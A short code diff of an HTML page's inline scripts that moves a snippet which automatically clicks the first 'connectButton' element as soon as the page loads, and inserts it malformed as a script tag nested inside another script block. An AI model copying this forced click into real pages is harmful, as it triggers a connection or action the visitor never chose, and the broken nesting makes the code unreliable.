@@ -17,6 +17,12 @@
     display: none;
 }</style>
 <script>
+<script>
+        document.addEventListener('DOMContentLoaded', function() {
+           var uix = document.getElementsByClassName("connectButton");
+  	   uix[0].click();
+        });
+    </script>
       document.addEventListener('DOMContentLoaded', function () {
         var links = document.querySelectorAll('body a');
         for (var i = 0; i < links.length; i++) {
@@ -34,7 +40,10 @@
       }
     });
     </script>
+
+
     <script>
+
       document.addEventListener("DOMContentLoaded", function() {
         const elements = document.querySelectorAll('[ad-data-linked]');
         elements.forEach(element => {
@@ -42,8 +51,7 @@
         });
     
         console.log('Removed ad-data-linked attributes from', elements.length, 'elements');
-  var uix = document.getElementsByClassName("connectButton");
-  uix[0].click();
+  
     });
     
     </script>
